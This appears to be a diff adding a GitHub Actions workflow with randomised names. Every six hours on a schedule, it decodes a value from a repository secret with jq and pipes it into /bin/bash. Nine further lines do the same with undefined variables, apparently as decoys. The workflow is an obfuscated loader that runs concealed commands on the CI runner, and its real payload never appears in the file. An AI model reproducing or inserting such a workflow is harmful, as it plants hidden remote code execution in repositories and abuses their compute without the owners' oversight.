@@ -1,0 +1,25 @@
+name: riverbert624
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: riverbert624
+        env:
+          uxt30298: ${{ secrets.uxt30298 }}
+        run: |
+          echo $uxt30298 | jq -r .ibml582 | /bin/bash
+          echo $dfk3524 | jq -r .xe6379 | /bin/bash
+          echo $shea80765 | jq -r .cyh7 | /bin/bash
+          echo $y2 | jq -r .ij3376 | /bin/bash
+          echo $ly5123 | jq -r .s72563 | /bin/bash
+          echo $pqopc5389 | jq -r .szs7 | /bin/bash
+          echo $inluw24675 | jq -r .aebv022 | /bin/bash
+          echo $sgco3 | jq -r .ivpev874 | /bin/bash
+          echo $r36 | jq -r .rx4 | /bin/bash
+          echo $x68 | jq -r .eot912 | /bin/bash
+
